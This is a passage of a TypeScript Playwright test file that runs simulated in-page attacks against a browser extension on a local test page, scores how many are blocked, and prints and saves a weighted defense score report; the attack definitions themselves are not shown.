    const normalized = maxScore > 0 ? (score / maxScore) * 100 : 0;
    weightedScore += normalized * weight;
    totalWeight += weight;
  }

  const totalScore = totalWeight > 0 ? Math.round(weightedScore / totalWeight) : 0;

  return {
    totalScore,
    maxScore: 100,
    grade: scoreToGrade(totalScore),
    categories,
  };
}

// ============================================================================
// Tests
// ============================================================================

test.describe("Defense Score (MAIN World Attacks)", () => {
  let ctx: TestContext;
  const allResults: TestResultEntry[] = [];

  test.beforeAll(async () => {
    ctx = await setupBrowser();
    // Navigate to test page
    await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`, {
      waitUntil: "domcontentloaded",
    });
    // Wait for extension content scripts to inject
    await ctx.page.waitForTimeout(2000);
  });

  test.afterAll(async () => {
    // Calculate and print defense score
    const { totalScore, grade, categories } = calculateScore(allResults);

    console.log("\n" + "=".repeat(70));
    console.log("  DEFENSE SCORE REPORT (MAIN World Attack Simulation)");
    console.log("=".repeat(70));
    console.log(`\n  Total Score: ${totalScore}/100   Grade: ${grade}`);
    console.log(`  Tests Run:   ${allResults.length}`);
    console.log(`  Blocked:     ${allResults.filter((r) => r.result.blocked).length}`);
    console.log(`  Passed:      ${allResults.filter((r) => !r.result.blocked).length}`);

    console.log(`\n  ${"Category".padEnd(22)} ${"Score".padStart(8)} ${"Blocked".padStart(9)} ${"Weight".padStart(8)}`);
    console.log("  " + "-".repeat(50));

    // Sort categories by weight descending
    const sorted = [...categories].sort(
      (a, b) => (CATEGORY_WEIGHTS[b.category] ?? 0) - (CATEGORY_WEIGHTS[a.category] ?? 0)
    );

    for (const cat of sorted) {
      const pct = cat.maxScore > 0 ? Math.round((cat.score / cat.maxScore) * 100) : 0;
      const label = CATEGORY_LABELS[cat.category] ?? cat.category;
      const weightPct = Math.round((CATEGORY_WEIGHTS[cat.category] ?? 0) * 100);
      console.log(
        `  ${label.padEnd(22)} ${`${pct}%`.padStart(8)} ${`${cat.blocked}/${cat.total}`.padStart(9)} ${`${weightPct}%`.padStart(8)}`
      );
    }

    console.log(`\n  ${"DETAILED RESULTS:".padEnd(50)}`);
    console.log("  " + "-".repeat(66));

    for (const entry of allResults) {
      const status = entry.result.blocked ? "[BLOCKED]" : "[ PASS ]";
      const sev = entry.attack.severity.toUpperCase().padEnd(8);
      console.log(`  ${status} ${sev} ${entry.attack.name}`);
      console.log(`           ${entry.result.details.substring(0, 80)}`);
    }

    console.log("\n" + "=".repeat(70));

    // Save report
    const report = {
      timestamp: new Date().toISOString(),
      totalScore,
      grade,
      testsRun: allResults.length,
      blocked: allResults.filter((r) => r.result.blocked).length,
      categories: sorted.map((c) => ({
        category: c.category,
        label: CATEGORY_LABELS[c.category],
        score: c.score,
        maxScore: c.maxScore,
        pct: c.maxScore > 0 ? Math.round((c.score / c.maxScore) * 100) : 0,
        blocked: c.blocked,
        total: c.total,
        weight: CATEGORY_WEIGHTS[c.category],
      })),
      results: allResults.map((r) => ({
        id: r.attack.id,
        name: r.attack.name,
        category: r.attack.category,
        severity: r.attack.severity,
        blocked: r.result.blocked,
        executionTime: r.result.executionTime,
        details: r.result.details,
      })),
    };
    writeFileSync(DEFENSE_REPORT_PATH, JSON.stringify(report, null, 2));
    console.log(`\n  Report saved to: ${DEFENSE_REPORT_PATH}`);

    // Cleanup
    if (ctx?.context) await ctx.context.close();
    if (ctx?.server) ctx.server.close();
  });

  for (const attack of attacks) {
    test(`${attack.category}/${attack.id}: ${attack.name}`, async () => {
      // Re-navigate for isolation (some attacks modify the page)
      // Only navigate if needed (keep test fast by checking if still on test page)
      const currentUrl = ctx.page.url();
      if (!currentUrl.includes(`127.0.0.1:${ctx.serverPort}`)) {
        await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`, {
          waitUntil: "domcontentloaded",
        });
        await ctx.page.waitForTimeout(500);
      }

      const result = await attack.simulate(ctx.page);
      allResults.push({ attack, result });

      // Just log, don't fail - we're measuring, not asserting
      const status = result.blocked ? "BLOCKED" : "PASSED";
      console.log(`  [${status}] ${attack.id}: ${result.details.substring(0, 70)}`);
    });
  }
});
